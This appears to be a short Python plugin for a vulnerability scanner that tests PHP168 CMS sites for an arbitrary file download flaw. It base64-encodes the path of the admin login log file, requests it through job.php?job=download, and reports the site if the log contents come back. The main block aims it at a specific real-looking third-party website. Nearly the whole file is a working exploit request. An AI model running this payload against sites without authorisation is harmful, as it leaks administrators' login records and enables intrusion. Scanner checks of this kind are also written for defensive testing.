#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:IOT
#refer:http://www.51cto.com/art/200812/100919.htm 
import base64
def assign(service,arg):
    if service == "php168":
        return True,arg
def audit(arg):
    base=arg+'/cache/adminlogin_logs.php' 
    s=base64.b64encode(base)
    payload = "job.php?job=download&url=%s" % s 
    url = arg + payload
    code ,head,res,body,_ = curl.curl(url)
    if code == 200 and 'logdb' in res:
        security_warning(url)    


if __name__ == '__main__':
    from dummy import *
    audit(assign('php168', 'http://www.hhzx.cn/')[1])